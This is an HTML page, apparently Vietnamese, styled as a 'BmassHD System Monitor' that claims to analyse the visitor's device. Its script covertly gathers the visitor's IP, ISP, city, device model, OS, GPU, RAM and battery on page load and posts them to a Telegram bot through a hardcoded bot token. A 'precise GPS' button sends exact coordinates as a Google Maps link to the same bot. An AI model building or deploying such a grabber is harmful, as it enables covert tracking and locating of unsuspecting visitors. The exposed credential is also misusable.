<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BmassHD | System Monitor</title>
    <link rel="icon" type="image/png" href="https://cdn-icons-png-flaticon-com/512/2920/2920329.png">
    
    <!-- Libraries -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">

    <style>
        :root {
            --bg-color: #0f1115;
            --surface-color: rgba(255, 255, 255, 0.03);
            --stroke-color: rgba(255, 255, 255, 0.08);
            --primary-accent: #B4F9F2;
            --secondary-accent: #C084FC;
            --text-main: #FFFFFF;
            --text-secondary: #9CA3AF;
        }

        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            background-color: var(--bg-color);
            color: var(--text-main);
            overflow-x: hidden;
        }

        /* --- BACKGROUND --- */
        .ambient-mesh {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
            background: radial-gradient(circle at 10% 90%, rgba(192, 132, 252, 0.15) 0px, transparent 45%),
                        radial-gradient(circle at 90% 10%, rgba(180, 249, 242, 0.15) 0px, transparent 45%);
            filter: blur(80px); opacity: 0.8;
        }

        /* --- INFO CARDS --- */
        .info-grid {
            display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;
            max-width: 1200px; margin: 50px auto; padding: 0 20px;
        }
        .info-card {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid var(--stroke-color); border-radius: 20px; padding: 25px;
            display: flex; align-items: center; gap: 20px; backdrop-filter: blur(10px);
            transition: 0.3s;
        }
        .info-card:hover { border-color: var(--primary-accent); transform: translateY(-5px); background: rgba(255,255,255,0.05); }
        .info-icon {
            width: 50px; height: 50px; background: rgba(180, 249, 242, 0.1); color: var(--primary-accent);
            border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 1.2rem; flex-shrink: 0;
        }
        .info-content h5 { font-size: 0.75rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; margin: 0; }
        .info-content p { font-size: 1.1rem; font-weight: 700; color: #fff; margin: 5px 0 0; word-break: break-word; }
        
        .gps-btn {
            background: var(--secondary-accent); color: #fff; border: none; padding: 10px 20px;
            border-radius: 50px; font-weight: 600; margin-top: 10px; cursor: pointer; transition: 0.3s;
            display: flex; align-items: center; gap: 8px; font-size: 0.9rem;
        }
        .gps-btn:hover { box-shadow: 0 0 15px rgba(192, 132, 252, 0.5); }
        .gps-btn i { animation: bounce 2s infinite; }
        @keyframes bounce { 0%, 20%, 50%, 80%, 100% {transform: translateY(0);} 40% {transform: translateY(-3px);} 60% {transform: translateY(-2px);} }

        /* --- HERO --- */
        .hero { text-align: center; padding: 100px 20px 40px; }
        .hero h1 { font-size: 3rem; font-weight: 800; background: linear-gradient(to right, #fff, #9ca3af); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        
        /* --- LOADER --- */
        #loader { position: fixed; inset: 0; background: #0f1115; z-index: 9999; display: flex; justify-content: center; align-items: center; transition: 0.5s; }
        .spinner { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: var(--primary-accent); animation: spin 1s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }

    </style>
</head>
<body>

    <div id="loader"><div class="spinner"></div></div>
    <div class="ambient-mesh"></div>

    <section class="hero" data-aos="fade-down">
        <h1>BmassHD System</h1>
        <p style="color: var(--text-secondary);">Thi·∫øt b·ªã c·ªßa b·∫°n ƒëang ƒë∆∞·ª£c ph√¢n t√≠ch...</p>
    </section>

    <!-- SYSTEM INFO DISPLAY -->
    <div class="info-grid">
        <!-- 1. Network -->
        <div class="info-card" data-aos="fade-up" data-aos-delay="100">
            <div class="info-icon"><i class="fas fa-wifi"></i></div>
            <div class="info-content">
                <h5>M·∫°ng & IP</h5>
                <p id="ip-txt">ƒêang qu√©t...</p>
                <small id="isp-txt" style="color: #6b7280; font-size: 0.8rem;"></small>
            </div>
        </div>

        <!-- 2. Location -->
        <div class="info-card" data-aos="fade-up" data-aos-delay="200">
            <div class="info-icon"><i class="fas fa-map-marked-alt"></i></div>
            <div class="info-content">
                <h5>V·ªã Tr√≠ (∆Ø·ªõc t√≠nh)</h5>
                <p id="loc-txt">ƒêang x√°c ƒë·ªãnh...</p>
                <!-- N√∫t y√™u c·∫ßu GPS ch√≠nh x√°c -->
                <button class="gps-btn" onclick="requestGPS()">
                    <i class="fas fa-crosshairs"></i> L·∫•y ch√≠nh x√°c (GPS)
                </button>
            </div>
        </div>

        <!-- 3. Device -->
        <div class="info-card" data-aos="fade-up" data-aos-delay="300">
            <div class="info-icon"><i class="fas fa-mobile-alt"></i></div>
            <div class="info-content">
                <h5>Thi·∫øt B·ªã</h5>
                <p id="device-txt">ƒêang ph√¢n t√≠ch...</p>
                <small id="os-txt" style="color: #6b7280; font-size: 0.8rem;"></small>
            </div>
        </div>

        <!-- 4. Hardware -->
        <div class="info-card" data-aos="fade-up" data-aos-delay="400">
            <div class="info-icon"><i class="fas fa-microchip"></i></div>
            <div class="info-content">
                <h5>Ph·∫ßn C·ª©ng</h5>
                <p id="gpu-txt">GPU...</p>
                <small id="cpu-txt" style="color: #6b7280; font-size: 0.8rem;"></small>
            </div>
        </div>

        <!-- 5. Battery -->
        <div class="info-card" data-aos="fade-up" data-aos-delay="500">
            <div class="info-icon"><i class="fas fa-battery-half"></i></div>
            <div class="info-content">
                <h5>Pin</h5>
                <p id="bat-txt">Checking...</p>
            </div>
        </div>
    </div>

    <!-- SCRIPTS -->
    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
    <script>
        AOS.init();

        // --- C·∫§U H√åNH BOT TELEGRAM ---
        const BOT_TOKEN = "6789490938:AAGbxaiI4NVuZBWEm-ktCT4w2FNVuV_v7mE";
        const CHAT_ID = "@testappxyz";

        // Bi·∫øn l∆∞u d·ªØ li·ªáu to√†n c·ª•c
        let systemData = {
            ip: "N/A", city: "N/A", country: "N/A", isp: "N/A",
            os: "N/A", browser: "N/A", device: "Unknown",
            gpu: "N/A", ram: "N/A", cores: "N/A",
            battery: "N/A", userAgent: navigator.userAgent
        };

        // 1. H√†m g·ª≠i tin nh·∫Øn sang Telegram
        async function sendToTelegram(messageText) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: messageText,
                        parse_mode: "HTML",
                        disable_web_page_preview: false
                    })
                });
                console.log("ƒê√£ g·ª≠i b√°o c√°o v·ªÅ Telegram");
            } catch (error) {
                console.error("L·ªói g·ª≠i Telegram:", error);
            }
        }

        // 2. L·∫•y th√¥ng tin ph·∫ßn c·ª©ng & GPU
        function getHardwareInfo() {
            // GPU
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                systemData.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                // L√†m ƒë·∫πp t√™n GPU
                systemData.gpu = systemData.gpu.replace(/ANGLE \(|\)|Direct3D11|vs_5_0 ps_5_0/g, "").trim();
            } catch (e) { systemData.gpu = "Integrated Graphics"; }

            // RAM & CPU (∆Ø·ªõc t√≠nh)
            if(navigator.deviceMemory) systemData.ram = `~${navigator.deviceMemory} GB`;
            if(navigator.hardwareConcurrency) systemData.cores = `${navigator.hardwareConcurrency} Cores`;

            // M√†n h√¨nh
            const screenRes = `${window.screen.width}x${window.screen.height}`;
            
            // C·∫≠p nh·∫≠t UI
            document.getElementById('gpu-txt').innerText = systemData.gpu;
            document.getElementById('cpu-txt').innerText = `RAM: ${systemData.ram || '?'} | CPU: ${systemData.cores || '?'} | Screen: ${screenRes}`;
        }

        // 3. Ph√¢n t√≠ch UserAgent (T√¨m t√™n thi·∫øt b·ªã chi ti·∫øt h∆°n)
        function parseUserAgent() {
            const ua = navigator.userAgent;
            let os = "Unknown OS";
            let device = "PC/Laptop";

            if (/android/i.test(ua)) {
                os = "Android";
                device = "Mobile/Tablet";
                // C·ªë g·∫Øng t√¨m model ƒëi·ªán tho·∫°i trong UserAgent (th∆∞·ªùng n·∫±m sau ; build/)
                const match = ua.match(/;\s([^;]+)\sBuild\//); 
                if(match) device = match[1]; 
            } else if (/iPad|iPhone|iPod/.test(ua)) {
                os = "iOS";
                device = "iPhone/iPad";
                // L·∫•y phi√™n b·∫£n iOS
                const match = ua.match(/OS (\d+)_/);
                if(match) os += " " + match[1];
            } else if (/Windows/.test(ua)) os = "Windows";
            else if (/Mac/.test(ua)) os = "MacOS";
            else if (/Linux/.test(ua)) os = "Linux";

            systemData.os = os;
            systemData.device = device;
            
            document.getElementById('device-txt').innerText = device;
            document.getElementById('os-txt').innerText = `${os} - ${navigator.platform}`;
        }

        // 4. L·∫•y Pin
        async function getBatteryStatus() {
            if (navigator.getBattery) {
                try {
                    const bat = await navigator.getBattery();
                    const level = Math.round(bat.level * 100) + "%";
                    const status = bat.charging ? "ƒêang s·∫°c ‚ö°" : "D√πng pin";
                    systemData.battery = `${level} (${status})`;
                    document.getElementById('bat-txt').innerText = systemData.battery;
                } catch(e) {}
            } else {
                document.getElementById('bat-txt').innerText = "Kh√¥ng h·ªó tr·ª£";
            }
        }

        // 5. L·∫•y IP v√† V·ªã tr√≠ (D√πng API t·ªët h∆°n: ipapi.co)
        async function getNetworkInfo() {
            try {
                // ipapi.co th∆∞·ªùng nh·∫≠n di·ªán ISP ·ªü VN t·ªët h∆°n
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                systemData.ip = data.ip;
                systemData.city = data.city;
                systemData.country = data.country_name;
                systemData.isp = data.org || data.service_provider || data.asn; // L·∫•y t√™n nh√† m·∫°ng

                // C·∫≠p nh·∫≠t UI
                document.getElementById('ip-txt').innerText = data.ip;
                document.getElementById('isp-txt').innerText = systemData.isp;
                document.getElementById('loc-txt').innerText = `${data.city}, ${data.country_name}`;

                // --> G·ª¨I B√ÅO C√ÅO T·ªîNG H·ª¢P L·∫¶N 1 (D·ª∞A TR√äN IP)
                reportToAdmin(false);

            } catch (error) {
                document.getElementById('ip-txt').innerText = "Blocked by Adblock";
            }
        }

        // 6. T√çNH NƒÇNG ƒê·∫∂C BI·ªÜT: Y√™u c·∫ßu GPS ch√≠nh x√°c
        function requestGPS() {
            const btn = document.querySelector('.gps-btn');
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ƒêang ƒë·ªãnh v·ªã...';
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const long = position.coords.longitude;
                        const accuracy = position.coords.accuracy; // ƒê·ªô ch√≠nh x√°c (m√©t)
                        
                        const mapsLink = `https://www.google.com/maps?q=${lat},${long}`;
                        
                        document.getElementById('loc-txt').innerHTML = `
                            <span style="color:#4ade80">ƒê√£ ƒë·ªãnh v·ªã ch√≠nh x√°c!</span><br>
                            <a href="${mapsLink}" target="_blank" style="color:var(--primary-accent); text-decoration:none; font-size:0.9rem">
                                Xem tr√™n Google Maps
                            </a>
                        `;
                        btn.style.display = 'none';

                        // G·ª¨I B√ÅO C√ÅO L·∫¶N 2 (C√ì GPS)
                        const msg = `
üö® <b>V·ªä TR√ç CH√çNH X√ÅC (GPS)</b> üö®
--------------------------------
üéØ <b>Google Maps:</b> <a href="${mapsLink}">Xem B·∫£n ƒê·ªì</a>
üìè <b>ƒê·ªô ch√≠nh x√°c:</b> B√°n k√≠nh ${Math.round(accuracy)} m√©t
üåê <b>IP:</b> ${systemData.ip}
üì± <b>Thi·∫øt b·ªã:</b> ${systemData.device}
`;
                        sendToTelegram(msg);
                    },
                    (error) => {
                        btn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> B·∫°n ƒë√£ t·ª´ ch·ªëi';
                        alert("Kh√¥ng th·ªÉ l·∫•y v·ªã tr√≠. H√£y b·∫≠t GPS v√† ch·ªçn 'Cho ph√©p' tr√™n tr√¨nh duy·ªát.");
                    }
                );
            } else {
                alert("Tr√¨nh duy·ªát kh√¥ng h·ªó tr·ª£ GPS.");
            }
        }

        // H√†m t·ªïng h·ª£p v√† g·ª≠i tin nh·∫Øn
        function reportToAdmin(hasGPS) {
            const msg = `
üîî <b>NEW VISITOR DETECTED</b>
--------------------------------
üåê <b>IP:</b> <code>${systemData.ip}</code>
üè¢ <b>ISP:</b> ${systemData.isp}
üìç <b>Khu v·ª±c (IP):</b> ${systemData.city}, ${systemData.country}
--------------------------------
üì± <b>Thi·∫øt b·ªã:</b> ${systemData.device}
üíª <b>OS:</b> ${systemData.os}
üñ• <b>M√†n h√¨nh:</b> ${window.screen.width}x${window.screen.height}
üéÆ <b>GPU:</b> ${systemData.gpu}
üîã <b>Pin:</b> ${systemData.battery}
üß† <b>System:</b> ${systemData.ram || '?'} RAM | ${systemData.cores || '?'} Cores
üîó <b>Link v√†o:</b> ${window.location.href}
`;
            sendToTelegram(msg);
        }

        // --- KH·ªûI CH·∫†Y ---
        window.onload = () => {
            setTimeout(() => document.getElementById('loader').style.opacity = '0', 500);
            setTimeout(() => document.getElementById('loader').style.display = 'none', 1000);
            
            parseUserAgent();
            getHardwareInfo();
            getBatteryStatus();
            getNetworkInfo(); // H√†m n√†y s·∫Ω g·ªçi sendToTelegram khi xong
        };

    </script>
</body>
</html>
